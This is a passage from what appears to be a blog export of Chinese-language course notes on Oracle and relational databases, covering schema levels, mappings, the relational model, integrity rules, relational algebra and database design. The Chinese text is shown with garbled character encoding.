<li>å¤–æ¨¡å¼ä¸åº”ç”¨çš„å…³ç³»ï¼š<ul>
<li>åŒä¸€å¤–æ¨¡å¼ä¹Ÿå¯ä»¥ä¸ºå¤šä¸ªåº”ç”¨ç³»ç»Ÿæ‰€ä½¿ç”¨</li>
<li>ä½†ä¸€ä¸ªåº”ç”¨ç¨‹åºåªèƒ½ä½¿ç”¨ä¸€ä¸ªå¤–æ¨¡å¼</li>
</ul>
</li>
<li>æ¨¡å¼ä¸å¤–æ¨¡å¼çš„å…³ç³»ï¼š<ul>
<li>å¤–æ¨¡å¼é€šå¸¸æ˜¯æ¨¡å¼çš„å­é›†</li>
<li>ä¸€ä¸ªæ•°æ®åº“å¯ä»¥æœ‰å¤šä¸ªå¤–æ¨¡å¼ã€‚åæ˜ äº†ä¸åŒçš„ç”¨æˆ·çš„åº”ç”¨éœ€æ±‚ã€çœ‹å¾…æ•°æ®çš„æ–¹å¼ã€å¯¹æ•°æ®ä¿å¯†çš„è¦æ±‚</li>
</ul>
</li>
</ul>
</li>
<li><p>å†…æ¨¡å¼</p>
<ul>
<li>æ˜¯æ•°æ®ç‰©ç†ç»“æ„å’Œå­˜å‚¨æ–¹å¼çš„æè¿°</li>
<li>æ˜¯æ•°æ®åœ¨æ•°æ®åº“å†…éƒ¨çš„è¡¨ç¤ºæ–¹å¼<ul>
<li>è®°å½•çš„å­˜å‚¨æ–¹å¼ï¼ˆé¡ºåºå­˜å‚¨ï¼ŒæŒ‰ç…§Bæ ‘ç»“æ„å­˜å‚¨ï¼‰</li>
<li>ç´¢å¼•çš„ç»„ç»‡æ–¹å¼</li>
<li>æ•°æ®æ˜¯å¦å‹ç¼©å­˜å‚¨</li>
<li>æ•°æ®æ˜¯å¦åŠ å¯†</li>
<li>ä¸€ä¸ªæ•°æ®åº“åªæœ‰ä¸€ä¸ªå†…æ¨¡å¼</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="æ•°æ®åº“çš„ä¸¤çº§æ˜ åƒ"><a href="#æ•°æ®åº“çš„ä¸¤çº§æ˜ åƒ" class="headerlink" title="æ•°æ®åº“çš„ä¸¤çº§æ˜ åƒ"></a>æ•°æ®åº“çš„ä¸¤çº§æ˜ åƒ</h4><ul>
<li>ä¸‰çº§æ¨¡å¼æ˜¯å¯¹æ•°æ®çš„ä¸‰ä¸ªæŠ½è±¡çº§åˆ«</li>
<li>äºŒçº§æ˜ è±¡åœ¨DBMSå†…éƒ¨å®ç°è¿™ä¸‰ä¸ªæŠ½è±¡å±‚æ¬¡çš„è”ç³»å’Œè½¬æ¢</li>
<li>å¤–æ¨¡å¼\æ¨¡å¼æ˜ åƒ<ul>
<li>ä¿è¯æ•°æ®çš„é€»è¾‘ç‹¬ç«‹æ€§</li>
<li>åŒä¸€ä¸ªæ¨¡å¼å¯ä»¥æœ‰ä»»æ„å¤šä¸ªå¤–æ¨¡å¼ï¼Œå¤–æ¨¡å¼ï¼æ¨¡å¼æ˜ è±¡ï¼Œå®šä¹‰å¤–æ¨¡å¼ä¸æ¨¡å¼ä¹‹é—´çš„å¯¹åº”å…³ç³»ï¼› å½“æ¨¡å¼æ”¹å˜æ—¶ï¼Œå¤–æ¨¡å¼ï¼æ¨¡å¼æ˜ è±¡ä½¿å¤–æ¨¡å¼ä¿æŒä¸å˜ï¼›</li>
<li>åº”ç”¨ç¨‹åºæ˜¯ä¾æ®æ•°æ®çš„å¤–æ¨¡å¼ç¼–å†™çš„ï¼Œä»è€Œä¸å¿…ä¿®æ”¹åº”ç”¨ç¨‹åºï¼Œä¿è¯äº†æ•°æ®ä¸ç¨‹åºçš„é€»è¾‘ç‹¬ç«‹æ€§</li>
</ul>
</li>
<li>æ¨¡å¼ï¼å†…æ¨¡å¼æ˜ è±¡<ul>
<li>ä¿è¯æ•°æ®çš„ç‰©ç†ç‹¬ç«‹æ€§ã€‚</li>
<li>æ¨¡å¼ï¼å†…æ¨¡å¼æ˜ è±¡å®šä¹‰äº†æ•°æ®å…¨å±€é€»è¾‘ç»“æ„ å…¨å±€é€»è¾‘ç»“æ„ä¸å­˜å‚¨ç»“æ„ å‚¨ç»“æ„ä¹‹é—´çš„å¯¹åº”å…³ç³»ã€‚</li>
<li>å½“æ•°æ®åº“çš„å­˜å‚¨ç»“æ„æ”¹å˜äº†ï¼Œæ¨¡å¼ï¼å†…æ¨¡å¼æ˜ è±¡ä½¿æ¨¡å¼ä¿æŒä¸å˜ã€‚</li>
<li>åº”ç”¨ç¨‹åºä¸å—å½±å“ã€‚ä¿è¯äº†æ•°æ®ä¸ç¨‹åºçš„ç‰©ç†ç‹¬ç«‹æ€§</li>
</ul>
</li>
<li>æ•°æ®åº“ç³»ç»Ÿå¤–éƒ¨ç»“æ„<ul>
<li>ä»æ•°æ®åº“æœ€ç»ˆç”¨æˆ·è§’åº¦çœ‹ï¼ˆæ•°æ®åº“ç³»ç»Ÿå¤–éƒ¨çš„ä½“ç³»ç»“æ„ï¼‰ ï¼Œæ•°æ®åº“ç³»ç»Ÿçš„ç»“æ„åˆ†ä¸º:<ul>
<li>å•ç”¨æˆ·æ•°æ®åº“ç³»ç»Ÿ<ul>
<li>æ•´ä¸ªæ•°æ®åº“ç³»ç»Ÿ(åº”ç”¨ç¨‹åºã€DBMSã€æ•°æ®)è£…åœ¨ä¸€å°è®¡ç®—æœºä¸Šï¼Œä¸ºä¸€ä¸ªç”¨æˆ·ç‹¬å ï¼Œä¸åŒæœºå™¨ä¹‹é—´ä¸èƒ½å…±äº«æ•°æ®ã€‚</li>
</ul>
</li>
<li>é›†ä¸­å¼ç»“æ„</li>
<li>å®¢æˆ·ï¼æœåŠ¡å™¨</li>
<li>æµè§ˆå™¨ï¼åº”ç”¨æœåŠ¡å™¨ï¼æ•°æ®åº“æœåŠ¡å™¨å¤šå±‚ç»“æ„ç­‰</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><ul>
<li>æ•°æ®ç®¡ç†çš„å‘å±•è¿‡ç¨‹</li>
<li>æ•°æ®åº“ç³»ç»Ÿçš„ç»„æˆ</li>
<li>æ•°æ®æ¨¡å‹<ul>
<li>æ•°æ®æ¨¡å‹çš„ä¸‰è¦ç´ </li>
<li>æ¦‚å¿µæ¨¡å‹ï¼Œ E-Ræ¨¡å‹</li>
<li>ä¸‰ç§ä¸»è¦æ•°æ®æ¨¡å‹</li>
</ul>
</li>
<li>æ•°æ®åº“ç³»ç»Ÿç»“æ„<ul>
<li>æ•°æ®åº“ç³»ç»Ÿä¸‰çº§æ¨¡å¼ç»“æ„</li>
<li>æ•°æ®åº“ç³»ç»Ÿä¸¤çº§æ˜ åƒç³»ç»Ÿç»“æ„</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Note</category>
        <category>Oracle</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>Oracleæ•°æ®åº“ç¬¬ä¸‰å‘¨</title>
    <url>/2019/12/17/Oracle/%E7%AC%AC3%E5%91%A8%E8%AF%BE/</url>
    <content><![CDATA[<h1 id="Oracleæ•°æ®åº“ç¬¬ä¸‰å‘¨"><a href="#Oracleæ•°æ®åº“ç¬¬ä¸‰å‘¨" class="headerlink" title="Oracleæ•°æ®åº“ç¬¬ä¸‰å‘¨"></a>Oracleæ•°æ®åº“ç¬¬ä¸‰å‘¨</h1><h2 id="å…³ç³»æ•°æ®åº“ç®€ä»‹"><a href="#å…³ç³»æ•°æ®åº“ç®€ä»‹" class="headerlink" title="å…³ç³»æ•°æ®åº“ç®€ä»‹"></a>å…³ç³»æ•°æ®åº“ç®€ä»‹</h2><ul>
<li>æå‡ºå…³ç³»æ¨¡å‹çš„æ˜¯ç¾å›½ æå‡ºå…³ç³»æ¨¡å‹çš„æ˜¯ç¾å›½IBMå…¬å¸çš„ å…¬å¸çš„E.F.Codd<ul>
<li>1970å¹´æå‡ºå…³ç³»æ•°æ®æ¨¡å‹ å¹´æå‡ºå…³ç³»æ•°æ®æ¨¡å‹<ul>
<li>E.F.Codd, â€œA Relational Model of Data for Large Shared Data Banksâ€, ã€ŠCommunication of the ACMã€‹1970</li>
</ul>
</li>
<li>ä¹‹åï¼Œæå‡ºäº†å…³ç³»ä»£æ•°å’Œå…³ç³»æ¼”ç®—çš„æ¦‚å¿µ</li>
<li>1972å¹´æå‡ºäº†å…³ç³»çš„ç¬¬ä¸€ã€ç¬¬äºŒã€ç¬¬ä¸‰èŒƒå¼</li>
<li>1974å¹´æå‡ºäº†å…³ç³»çš„ å¹´æå‡ºäº†å…³ç³»çš„BCèŒƒå¼</li>
</ul>
</li>
</ul>
<a id="more"></a>

<h2 id="å…³ç³»æ•°æ®åº“"><a href="#å…³ç³»æ•°æ®åº“" class="headerlink" title="å…³ç³»æ•°æ®åº“"></a>å…³ç³»æ•°æ®åº“</h2><h3 id="2-1å…³ç³»æ•°æ®ç»“æ„åŠå½¢å¼åŒ–å®šä¹‰"><a href="#2-1å…³ç³»æ•°æ®ç»“æ„åŠå½¢å¼åŒ–å®šä¹‰" class="headerlink" title="2.1å…³ç³»æ•°æ®ç»“æ„åŠå½¢å¼åŒ–å®šä¹‰"></a>2.1å…³ç³»æ•°æ®ç»“æ„åŠå½¢å¼åŒ–å®šä¹‰</h3><h4 id="2-1-1å…³ç³»"><a href="#2-1-1å…³ç³»" class="headerlink" title="2.1.1å…³ç³»"></a>2.1.1å…³ç³»</h4><ul>
<li>å•ä¸€çš„æ•°æ®ç»“æ„ å•ä¸€çš„æ•°æ®ç»“æ„â€”-å…³ç³»<ul>
<li>ç°å®ä¸–ç•Œçš„å®ä½“ä»¥åŠå®ä½“é—´çš„å„ç§è”ç³»å‡ç”¨å…³ç³»æ¥è¡¨ç¤ºé€»è¾‘ç»“æ„â€”äºŒç»´è¡¨</li>
</ul>
</li>
<li>ä»ç”¨æˆ·è§’åº¦ï¼Œå…³ç³»æ¨¡å‹ä¸­æ•°æ®çš„é€»è¾‘ç»“æ„æ˜¯ä¸€å¼ äºŒç»´è¡¨</li>
<li>å»ºç«‹åœ¨é›†åˆä»£æ•°çš„åŸºç¡€ä¸Š</li>
</ul>
<p>è¡¥å……</p>
<ol>
<li>åŸŸ<ul>
<li>åŸŸæ˜¯ä¸€ç»„å…·æœ‰ç›¸åŒæ•°æ®ç±»å‹çš„å€¼çš„é›†åˆ</li>
</ul>
</li>
<li>ç¬›å¡å°”ç§¯</li>
<li>å…³ç³»</li>
</ol>
<h4 id="2-1-2å…³ç³»æ¨¡å¼"><a href="#2-1-2å…³ç³»æ¨¡å¼" class="headerlink" title="2.1.2å…³ç³»æ¨¡å¼"></a>2.1.2å…³ç³»æ¨¡å¼</h4><h5 id="1-ä»€ä¹ˆæ˜¯å…³ç³»æ¨¡å¼"><a href="#1-ä»€ä¹ˆæ˜¯å…³ç³»æ¨¡å¼" class="headerlink" title="1. ä»€ä¹ˆæ˜¯å…³ç³»æ¨¡å¼"></a>1. ä»€ä¹ˆæ˜¯å…³ç³»æ¨¡å¼</h5><ul>
<li>å…³ç³»æ¨¡å¼ï¼ˆ å…³ç³»æ¨¡å¼ï¼ˆRelation Schemaï¼‰æ˜¯å‹</li>
<li>å…³ç³»æ˜¯å€¼çš„é›†åˆ</li>
<li>å…³ç³»æ¨¡å¼æ˜¯å¯¹å…³ç³»çš„æè¿°<ul>
<li>å…ƒç»„é›†åˆçš„ç»“æ„<ul>
<li>å±æ€§æ„æˆæ€§æ„æˆ</li>
<li>å±æ€§æ¥è‡ªçš„åŸŸ</li>
<li>å±æ€§ä¸åŸŸä¹‹é—´çš„æ˜ è±¡å…³ç³»</li>
</ul>
</li>
<li>å…ƒç»„è¯­ä¹‰ä»¥åŠå®Œæ•´æ€§çº¦æŸæ¡ä»¶</li>
<li>å±æ€§é—´çš„æ•°æ®ä¾èµ–å…³ç³»é›†åˆ</li>
</ul>
</li>
</ul>
<h5 id="2-å®šä¹‰å…³ç³»æ¨¡å¼"><a href="#2-å®šä¹‰å…³ç³»æ¨¡å¼" class="headerlink" title="2. å®šä¹‰å…³ç³»æ¨¡å¼"></a>2. å®šä¹‰å…³ç³»æ¨¡å¼</h5><p>å…³ç³»æ¨¡å¼å¯ä»¥å½¢å¼åŒ–åœ°è¡¨ç¤ºä¸ºï¼š</p>
<table>
<thead>
<tr>
<th align="left">è¡¨ç¤º</th>
<th align="left">å«ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td align="left">R</td>
<td align="left">å…³ç³»å</td>
</tr>
<tr>
<td align="left">U</td>
<td align="left">ç»„æˆè¯¥å…³ç³»çš„å±æ€§åé›†åˆ</td>
</tr>
<tr>
<td align="left">D</td>
<td align="left">å±æ€§ç»„Uä¸­å±æ€§æ‰€æ¥è‡ªçš„åŸŸ</td>
</tr>
<tr>
<td align="left">DOM</td>
<td align="left">å±æ€§å‘åŸŸçš„æ˜ åƒé›†åˆ</td>
</tr>
<tr>
<td align="left">F</td>
<td align="left">å±æ€§é—´çš„æ•°æ®ä¾èµ–å…³ç³»é›†åˆ</td>
</tr>
</tbody></table>
<h5 id="3-å…³ç³»æ¨¡å¼ä¸å…³ç³»"><a href="#3-å…³ç³»æ¨¡å¼ä¸å…³ç³»" class="headerlink" title="3. å…³ç³»æ¨¡å¼ä¸å…³ç³»"></a>3. å…³ç³»æ¨¡å¼ä¸å…³ç³»</h5><ul>
<li>å…³ç³»æ¨¡å¼<ul>
<li>å¯¹å…³ç³»çš„æè¿°</li>
<li>é™æ€çš„ã€ç¨³å®šçš„</li>
</ul>
</li>
<li>å…³ç³»<ul>
<li>å…³ç³»æ¨¡å¼åœ¨æŸä¸€æ—¶åˆ»çš„çŠ¶æ€æˆ–å†…å®¹</li>
<li>åŠ¨æ€çš„ã€éšæ—¶é—´ä¸æ–­å˜åŒ–çš„</li>
</ul>
</li>
<li>å…³ç³»æ¨¡å¼å’Œå…³ç³»é€šå¸¸ç»Ÿç§°ä¸ºå…³ç³»</li>
<li>ä¸€èˆ¬é€šè¿‡ä¸Šä¸‹æ–‡åŠ ä»¥åŒºåˆ«</li>
</ul>
<h4 id="2-1-3å…³ç³»æ•°æ®åº“"><a href="#2-1-3å…³ç³»æ•°æ®åº“" class="headerlink" title="2.1.3å…³ç³»æ•°æ®åº“"></a>2.1.3å…³ç³»æ•°æ®åº“</h4><ul>
<li>å…³ç³»æ•°æ®åº“<ul>
<li>åœ¨ä¸€ä¸ªç»™å®šçš„åº”ç”¨é¢†åŸŸä¸­ï¼Œæ‰€æœ‰å…³ç³»çš„é›†åˆæ„æˆä¸€ä¸ªå…³ç³»æ•°æ®åº“</li>
</ul>
</li>
<li>å…³ç³»æ•°æ®åº“çš„å‹ä¸å€¼<ul>
<li><strong>å…³ç³»æ•°æ®åº“çš„å‹ï¼š</strong>å…³ç³»æ•°æ®åº“æ¨¡å¼ï¼ˆå¯¹å…³ç³»æ•°æ®åº“çš„æè¿°ï¼‰</li>
<li>å…³ç³»æ•°æ®åº“æ¨¡å¼åŒ…æ‹¬<ul>
<li>è‹¥å¹²åŸŸçš„å®šä¹‰</li>
<li>åœ¨è¿™äº›åŸŸä¸Šå®šä¹‰çš„è‹¥å¹²å…³ç³»æ¨¡å¼</li>
</ul>
</li>
<li><strong>å…³ç³»æ•°æ®åº“çš„å€¼ï¼š</strong>å…³ç³»æ¨¡å¼åœ¨æŸä¸€æ—¶åˆ»å¯¹åº”çš„å…³ç³»çš„é›†åˆï¼Œç®€ç§°ä¸ºå…³ç³»æ•°æ®åº“</li>
</ul>
</li>
</ul>
<h3 id="2-2å…³ç³»æ“ä½œ"><a href="#2-2å…³ç³»æ“ä½œ" class="headerlink" title="2.2å…³ç³»æ“ä½œ"></a>2.2å…³ç³»æ“ä½œ</h3><h4 id="2-2-1åŸºæœ¬å…³ç³»æ“ä½œ"><a href="#2-2-1åŸºæœ¬å…³ç³»æ“ä½œ" class="headerlink" title="2.2.1åŸºæœ¬å…³ç³»æ“ä½œ"></a>2.2.1åŸºæœ¬å…³ç³»æ“ä½œ</h4><h5 id="å¸¸ç”¨çš„å…³ç³»æ“ä½œ"><a href="#å¸¸ç”¨çš„å…³ç³»æ“ä½œ" class="headerlink" title="å¸¸ç”¨çš„å…³ç³»æ“ä½œ"></a>å¸¸ç”¨çš„å…³ç³»æ“ä½œ</h5><ul>
<li>æŸ¥è¯¢ï¼šé€‰æ‹©ã€æŠ•å½±ã€è¿æ¥ã€é™¤ã€å¹¶ã€äº¤ã€å·®</li>
<li>æ•°æ®æ›´æ–°ï¼šæ’å…¥ã€åˆ é™¤ã€ä¿®æ”¹</li>
<li>æŸ¥è¯¢çš„è¡¨è¾¾èƒ½åŠ›æ˜¯å…¶ä¸­æœ€ä¸»è¦çš„éƒ¨åˆ†</li>
<li>é€‰æ‹©ã€æŠ•å½±ã€å¹¶ã€å·®ã€ç¬›å¡å°”ç§¯æ˜¯5ç§åŸºæœ¬æ“ä½œ</li>
</ul>
<h5 id="å…³ç³»æ“ä½œçš„ç‰¹ç‚¹"><a href="#å…³ç³»æ“ä½œçš„ç‰¹ç‚¹" class="headerlink" title="å…³ç³»æ“ä½œçš„ç‰¹ç‚¹"></a>å…³ç³»æ“ä½œçš„ç‰¹ç‚¹</h5><ul>
<li>é›†åˆæ“ä½œæ–¹å¼ï¼šæ“ä½œçš„å¯¹è±¡å’Œç»“æœéƒ½æ˜¯é›†åˆ</li>
</ul>
<h4 id="2-2-2-å…³ç³»æ•°æ®åº“è¯­è¨€çš„åˆ†ç±»"><a href="#2-2-2-å…³ç³»æ•°æ®åº“è¯­è¨€çš„åˆ†ç±»" class="headerlink" title="2.2.2 å…³ç³»æ•°æ®åº“è¯­è¨€çš„åˆ†ç±»"></a>2.2.2 å…³ç³»æ•°æ®åº“è¯­è¨€çš„åˆ†ç±»</h4><ul>
<li>å…³ç³»ä»£æ•°è¯­è¨€<ul>
<li>ç”¨å¯¹å…³ç³»çš„è¿ç®—æ¥è¡¨è¾¾æŸ¥è¯¢è¦æ±‚</li>
<li>ä»£è¡¨ï¼šISBL</li>
</ul>
</li>
<li>å…³ç³»æ¼”ç®—è¯­è¨€ï¼šç”¨è°“è¯æ¥è¡¨è¾¾æŸ¥è¯¢è¦æ±‚<ul>
<li>å…ƒç»„å…³ç³»æ¼”ç®—è¯­è¨€<ul>
<li>è°“è¯å˜å…ƒçš„åŸºæœ¬å¯¹è±¡æ˜¯å…ƒç»„å˜é‡</li>
<li>ä»£è¡¨ï¼šAPLHA ï¼ŒQUEL</li>
</ul>
</li>
<li>åŸŸå…³ç³»æ¼”ç®—è¯­è¨€<ul>
<li>è°“è¯å˜å…ƒçš„åŸºæœ¬å¯¹è±¡æ˜¯åŸŸå˜é‡</li>
<li>ä»£è¡¨ï¼šQBE</li>
</ul>
</li>
<li>å…·æœ‰å…³ç³»ä»£æ•°å’Œå…³ç³»æ¼”ç®—åŒé‡ç‰¹ç‚¹çš„è¯­è¨€<ul>
<li>ä»£è¡¨ï¼š SQLï¼ˆStructured Query Languageï¼‰</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="2-3-å…³ç³»çš„å®Œæ•´æ€§"><a href="#2-3-å…³ç³»çš„å®Œæ•´æ€§" class="headerlink" title="2.3 å…³ç³»çš„å®Œæ•´æ€§"></a>2.3 å…³ç³»çš„å®Œæ•´æ€§</h3><h4 id="2-3-1å…³ç³»çš„ä¸‰ç±»å®Œæ•´æ€§çº¦æŸ"><a href="#2-3-1å…³ç³»çš„ä¸‰ç±»å®Œæ•´æ€§çº¦æŸ" class="headerlink" title="2.3.1å…³ç³»çš„ä¸‰ç±»å®Œæ•´æ€§çº¦æŸ"></a>2.3.1å…³ç³»çš„ä¸‰ç±»å®Œæ•´æ€§çº¦æŸ</h4><ul>
<li>å®ä½“å®Œæ•´æ€§å’Œå‚ç…§å®Œæ•´æ€§ï¼š<ul>
<li>å…³ç³»æ¨¡å‹å¿…é¡»æ»¡è¶³çš„å®Œæ•´æ€§çº¦æŸæ¡ä»¶ç§°ä¸ºå…³ç³»çš„ä¸¤ä¸ªä¸å˜æ€§åº”è¯¥ç”±å…³ç³»ç³»ç»Ÿè‡ªåŠ¨æ”¯æŒã€‚</li>
</ul>
</li>
<li>ç”¨æˆ·å®šä¹‰çš„å®Œæ•´æ€§ï¼š<ul>
<li>åº”ç”¨é¢†åŸŸéœ€è¦éµå¾ªçš„çº¦æŸæ¡ä»¶ï¼Œä½“ç°äº†å…·ä½“é¢†åŸŸä¸­çš„è¯­ä¹‰çº¦æŸã€‚</li>
</ul>
</li>
</ul>
<h4 id="2-3-2-å®ä½“å®Œæ•´æ€§"><a href="#2-3-2-å®ä½“å®Œæ•´æ€§" class="headerlink" title="2.3.2 å®ä½“å®Œæ•´æ€§"></a>2.3.2 å®ä½“å®Œæ•´æ€§</h4><ul>
<li>è§„åˆ™2.1 å®ä½“å®Œæ•´æ€§è§„åˆ™ï¼ˆEntity Integrityï¼‰<ul>
<li>è‹¥å±æ€§Aæ˜¯åŸºæœ¬å…³ç³»Rçš„ä¸»å±æ€§ï¼Œåˆ™å±æ€§Aä¸èƒ½å–ç©ºå€¼</li>
</ul>
</li>
<li>å®ä½“å®Œæ•´æ€§è§„åˆ™çš„è¯´æ˜<ul>
<li>(1) å®ä½“å®Œæ•´æ€§è§„åˆ™æ˜¯é’ˆå¯¹åŸºæœ¬å…³ç³»è€Œè¨€çš„ã€‚<ul>
<li>ä¸€ä¸ªåŸºæœ¬è¡¨é€šå¸¸å¯¹åº”ç°å®ä¸–ç•Œçš„ä¸€ä¸ªå®ä½“é›†ã€‚</li>
</ul>
</li>
<li>(2) ç°å®ä¸–ç•Œä¸­çš„å®ä½“æ˜¯å¯åŒºåˆ†çš„ï¼Œå³å®ƒä»¬å…·æœ‰æŸç§å”¯ä¸€æ€§æ ‡è¯†ã€‚</li>
<li>(3) å…³ç³»æ¨¡å‹ä¸­ä»¥ä¸»ç ä½œä¸ºå”¯ä¸€æ€§æ ‡è¯†ã€‚</li>
<li>(4) ä¸»ç ä¸­çš„å±æ€§å³ä¸»å±æ€§ä¸èƒ½å–ç©ºå€¼ã€‚<ul>
<li>ä¸»å±æ€§å–ç©ºå€¼ï¼Œå°±è¯´æ˜å­˜åœ¨æŸä¸ªä¸å¯æ ‡è¯†çš„å®ä½“ï¼Œå³å­˜åœ¨ä¸å¯åŒºåˆ†çš„å®ä½“ï¼Œè¿™ä¸ç¬¬ï¼ˆ2ï¼‰ç‚¹ç›¸çŸ›ç›¾ï¼Œå› æ­¤è¿™ä¸ªè§„åˆ™ç§°ä¸ºå®ä½“å®Œæ•´æ€§</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="å…³ç³»ä»£æ•°"><a href="#å…³ç³»ä»£æ•°" class="headerlink" title="å…³ç³»ä»£æ•°"></a>å…³ç³»ä»£æ•°</h3><p>å…³ç³»ä»£æ•°ä¸­</p>
<ul>
<li>é›†åˆè¿ç®—ç¬¦æœ‰ï¼šå¹¶ï¼ˆâˆªï¼‰ï¼Œå·®ï¼ˆï¼ï¼‰ï¼Œäº¤ï¼ˆâˆ©ï¼‰ï¼Œç¬›å¡å°”ç§¯ï¼ˆÃ—ï¼‰</li>
<li>ä¸“é—¨çš„å…³ç³»è¿ç®—ç¬¦æœ‰ï¼šé€‰æ‹©ï¼ˆÏƒï¼‰ï¼ŒæŠ•å½±ï¼ˆÏ€ï¼‰ï¼Œè¿æ¥ï¼ˆâ–·â—ï¼‰ï¼Œé™¤ï¼ˆÃ·ï¼‰</li>
<li>åŸºæœ¬å…³ç³»ä»£æ•°è¿ç®—æ˜¯ï¼šå¹¶ï¼ˆâˆªï¼‰ï¼Œå·®ï¼ˆï¼ï¼‰ï¼Œç¬›å¡å°”ç§¯ï¼ˆÃ—ï¼‰ï¼ŒæŠ•å½±ï¼ˆÏ€ï¼‰ï¼Œé€‰æ‹©ï¼ˆÏƒï¼‰</li>
</ul>
]]></content>
      <categories>
        <category>Note</category>
        <category>Oracle</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>æ•°æ®åº“è®¾è®¡</title>
    <url>/2019/12/17/Oracle/%E7%AC%AC9%E5%91%A8%E8%AF%BE/</url>
    <content><![CDATA[<h1 id="oracleæ•°æ®åº“ç¬¬ä¹å‘¨è¯¾â€”â€”æ•°æ®åº“è®¾è®¡"><a href="#oracleæ•°æ®åº“ç¬¬ä¹å‘¨è¯¾â€”â€”æ•°æ®åº“è®¾è®¡" class="headerlink" title="oracleæ•°æ®åº“ç¬¬ä¹å‘¨è¯¾â€”â€”æ•°æ®åº“è®¾è®¡"></a>oracleæ•°æ®åº“ç¬¬ä¹å‘¨è¯¾â€”â€”æ•°æ®åº“è®¾è®¡</h1><h2 id="è®¾è®¡æ–¹æ³•æ¦‚è¿°"><a href="#è®¾è®¡æ–¹æ³•æ¦‚è¿°" class="headerlink" title="è®¾è®¡æ–¹æ³•æ¦‚è¿°"></a>è®¾è®¡æ–¹æ³•æ¦‚è¿°</h2><p>æ•°æ®åº“è®¾è®¡å®šä¹‰ï¼šå¯¹äºä¸€ä¸ªç»™å®šçš„åº”ç”¨ç¯å¢ƒï¼Œæ„é€ æœ€ä¼˜çš„æ•°æ®åº“æ¨¡å¼ï¼Œå»ºç«‹æ•°æ®åº“åŠåº”ç”¨ç³»ç»Ÿï¼Œä½¿ä¹‹èƒ½æœ‰æ•ˆåœ°å­˜å‚¨æ•°æ®ï¼Œæ»¡è¶³å„ç§ç”¨æˆ·çš„åº”ç”¨éœ€æ±‚ã€‚</p>
<a id="more"></a>
<h2 id="æ•°æ®åº“è®¾è®¡çš„ç›®æ ‡"><a href="#æ•°æ®åº“è®¾è®¡çš„ç›®æ ‡" class="headerlink" title="æ•°æ®åº“è®¾è®¡çš„ç›®æ ‡"></a>æ•°æ®åº“è®¾è®¡çš„ç›®æ ‡</h2><ul>
<li>èƒ½å¤Ÿæ»¡è¶³æ•°æ®å­˜å‚¨éœ€æ±‚</li>
<li>ä¾¿äºæœ€ç»ˆç”¨æˆ·è®¿é—®</li>
<li>å…·æœ‰è‰¯å¥½çš„å®‰å…¨æœºåˆ¶</li>
<li>æ•°æ®å‡†ç¡®å¹¶æ˜“äºç®¡ç†</li>
<li>æ•°æ®åº“æ•´ä½“æ€§èƒ½è‰¯å¥½</li>
</ul>
<h2 id="æ•°æ®åº“è®¾è®¡çš„ç‰¹ç‚¹"><a href="#æ•°æ®åº“è®¾è®¡çš„ç‰¹ç‚¹" class="headerlink" title="æ•°æ®åº“è®¾è®¡çš„ç‰¹ç‚¹"></a>æ•°æ®åº“è®¾è®¡çš„ç‰¹ç‚¹</h2><ul>
<li>æ¶‰åŠå¤šå­¦ç§‘çš„ç»¼åˆæŠ€æœ¯</li>
<li>ç¡¬ä»¶ã€è½¯ä»¶å’Œå¹²ä»¶çš„ç»“åˆ</li>
<li>åºå¤§çš„å·¥ç¨‹é¡¹ç›®</li>
<li>ä¸‰åˆ†æŠ€æœ¯ï¼Œä¸ƒåˆ†ç®¡ç†ä¸ç»éªŒï¼ŒåäºŒåˆ†åŸºç¡€æ•°æ®</li>
<li>æ¶‰åŠç»“æ„è®¾è®¡å’Œè¡Œä¸ºè®¾è®¡äºŒæ–¹é¢</li>
</ul>
<h2 id="å…¸å‹çš„æ•°æ®åº“è®¾è®¡æ–¹æ³•"><a href="#å…¸å‹çš„æ•°æ®åº“è®¾è®¡æ–¹æ³•" class="headerlink" title="å…¸å‹çš„æ•°æ®åº“è®¾è®¡æ–¹æ³•"></a>å…¸å‹çš„æ•°æ®åº“è®¾è®¡æ–¹æ³•</h2><ol>
<li>åŸºäº3NFçš„æ–¹æ³•</li>
<li>ORACLE Barkeræ–¹æ³•</li>
<li>åŸºäºERæ¨¡å‹çš„æ–¹æ³•</li>
<li>è®¡ç®—æœºè¾…åŠ©æ–¹æ³•<ul>
<li>ORACLEï¼šDESIGNER 2000</li>
<li>SYBASEï¼šPOWERDESIGNER</li>
</ul>
</li>
</ol>
<h3 id="1-åŸºäº3NFçš„æ•°æ®åº“è®¾è®¡"><a href="#1-åŸºäº3NFçš„æ•°æ®åº“è®¾è®¡" class="headerlink" title="1.åŸºäº3NFçš„æ•°æ®åº“è®¾è®¡"></a>1.åŸºäº3NFçš„æ•°æ®åº“è®¾è®¡</h3><p>è®¾è®¡ä¼ä¸šæ¨¡å¼</p>
<ul>
<li>ç ”ç©¶åº”ç”¨ç¯å¢ƒï¼Œå¹¶è®¾å®šç¯å¢ƒä¸­æ‰€ä½¿ç”¨çš„èµ„æ–™</li>
<li>å†³å®šæ¯ä¸€ä¸ªæŠ¥è¡¨é‡Œå„è‡ªåŒ…å«çš„æ•°æ®å…ƒç´ </li>
<li>å†³å®šæ•°æ®ä¸å…ƒç´ ä¹‹é—´çš„å…³ç³»ï¼Œç¡®å®šä¸»å…³é”®å­—çš„æ•°æ®å…ƒç´ å’Œæ™®é€šæ•°æ®å…ƒç´ </li>
<li><strong>å¯¹æ¯ä¸€ç»„æ•°æ®å…ƒç´ æ¨å¯¼ç¬¬ä¸‰èŒƒå¼å…³ç³»</strong></li>
<li>åŸºäºå¾—åˆ°çš„ç¬¬ä¸‰èŒƒå¼å…³ç³»ç»™å‡ºæ•°æ®åº“ä¼ä¸šæ¨¡å¼</li>
</ul>
